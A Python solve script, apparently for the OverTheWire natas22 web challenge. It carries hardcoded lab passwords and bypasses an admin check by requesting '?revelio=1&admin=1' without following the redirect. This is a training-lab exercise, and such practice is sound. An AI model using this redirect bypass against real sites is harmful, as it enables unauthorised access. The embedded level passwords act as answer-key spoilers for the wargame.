import requests
from requests.auth import HTTPBasicAuth
from requests.sessions import RequestsCookieJar
import string
import random


def receive_response(_payload):
    auth_username = 'natas21'
    auth_password = 'IFekPyrQXftziDEsUr3x21sYuahypdgJ' 
    response = requests.post('http://natas21.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password), data=_payload)
    return response

# receive a requests.Response object and dissect it
def dissect_response(response):

    print("Encoding: " + response.apparent_encoding)
    print("-----------------------")
    print("Content: " + str(response.content))
    print("-----------------------")
    print("Cookies: " + str(response.cookies))
    print("-----------------------")
    print("Elapsed time: " + str(response.elapsed))
    print("-----------------------")
    print("Encoding: " + str(response.encoding))
    print("-----------------------")
    print("Headers: " + str(response.headers))
    print("-----------------------")
    print("History: " + str(response.history))
    print("-----------------------")
    try:
        print("JSON: " + str(response.json()))
    except:
        pass
    print("-----------------------")
    print("Links: " + str(response.links))
    print("-----------------------")
    print("Next: " + str(response.next))
    print("-----------------------")
    print("OK:" + str(response.ok))
    print("-----------------------")
    print("Raw: " + str(response.raw))
    print("-----------------------")
    print("Reason: " + str(response.reason))
    print("-----------------------")
    print("Status code: " + str(response.status_code))
    print("-----------------------")
    print("Text: " + str(response.text))
    print("-----------------------")
    print("URL: " + str(response.url))



def exploit():
    auth_username = 'natas22'
    auth_password = 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ' 
    sess = requests.Session()
    response = sess.post('http://natas22.natas.labs.overthewire.org/', auth=HTTPBasicAuth(auth_username, auth_password))
    dissect_response(response)
    print("----------------------------------")
    response = sess.get('http://natas22.natas.labs.overthewire.org/?revelio=1&admin=1', auth=HTTPBasicAuth(auth_username, auth_password), allow_redirects=False)
    dissect_response(response)
    print("----------------------------------")
    if(response.history):
        for resp in response.history:
            print(resp.status_code, resp.url)
        print("Final destination")
        print(response.status_code, response.url)
    print("----------------------------------")
    print(sess.cookies)


def analyse_PHPSESSID_generation_procedure():
    auth_username = 'natas22'
    auth_password = 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ' 

    for _ in range(100):
        print("heres")
        response = requests.get('http://natas22.natas.labs.overthewire.org/?revelio=1', auth=HTTPBasicAuth(auth_username, auth_password))
        for cookie in response.cookies:
            print(cookie.value) # nothing gets printed


exploit()